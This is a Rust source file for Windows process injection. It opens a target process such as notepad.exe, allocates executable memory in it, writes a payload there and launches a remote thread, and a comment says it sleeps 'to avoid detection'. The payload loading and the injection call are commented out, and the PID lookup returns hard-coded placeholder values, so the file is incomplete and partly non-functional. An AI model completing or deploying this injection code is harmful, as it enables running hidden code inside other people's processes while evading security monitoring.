use std::fs;
use std::io::{self, Write};
use std::process::{Command, exit};
use std::ptr;
use std::time::Duration;
use rand::{Rng, thread_rng};
use winapi::um::processthreadsapi::{OpenProcess, CreateRemoteThread};
use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory, VirtualFreeEx};
use winapi::um::winnt::{PROCESS_ALL_ACCESS, PAGE_EXECUTE_READWRITE, MEM_COMMIT, MEM_RESERVE, MEM_RELEASE};
use winapi::shared::minwindef::FALSE;

// Replace with the target process name
const TARGET_PROCESS_NAME: &str = "notepad.exe"; // Example target, change as needed
// Include your ASM payload as binary data
//const ASM_PAYLOAD: &[u8] = include_bytes!("path/to/simple.exe"); // Update this path accordingly

fn inject_payload(target_pid: u32, payload: &[u8]) -> Result<(), String> {
    unsafe {
        let process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);
        if process_handle.is_null() {
            return Err("Failed to open target process".to_string());
        }

        let remote_memory = VirtualAllocEx(
            process_handle,
            ptr::null_mut(),
            payload.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );
        if remote_memory.is_null() {
            return Err("Failed to allocate memory in target process".to_string());
        }

        let success = WriteProcessMemory(
            process_handle,
            remote_memory,
            payload.as_ptr() as _,
            payload.len(),
            ptr::null_mut(),
        );
        if success == 0 {
            VirtualFreeEx(process_handle, remote_memory, 0, MEM_RELEASE);
            return Err("Failed to write payload into target process".to_string());
        }

        CreateRemoteThread(process_handle, ptr::null_mut(), 0, Some(std::mem::transmute(remote_memory)), ptr::null_mut(), 0, ptr::null_mut());
    }
    Ok(())
}

fn find_process_id(process_name: &str) -> Option<u32> {
    // This function should be implemented to find the PID of the target process.
    // Placeholder logic to simulate finding the process ID.
    // You can use a library like `psutil` or `procfs` to achieve this.
    let processes = vec![(1234, "notepad.exe"), (5678, "explorer.exe")]; // Example process list

    for (pid, name) in processes {
        if name.eq_ignore_ascii_case(process_name) {
            return Some(pid);
        }
    }
    None
}

fn main() {
    // Find target process ID
    let target_pid = find_process_id(TARGET_PROCESS_NAME).expect("Target process not found");

    // Inject ASM payload
    //if let Err(e) = inject_payload(target_pid, ASM_PAYLOAD) {
      //  eprintln!("Injection error: {}", e);
       // exit(1);
    //}

    // Optionally, sleep for a bit to avoid detection
    std::thread::sleep(Duration::from_secs(5));
}

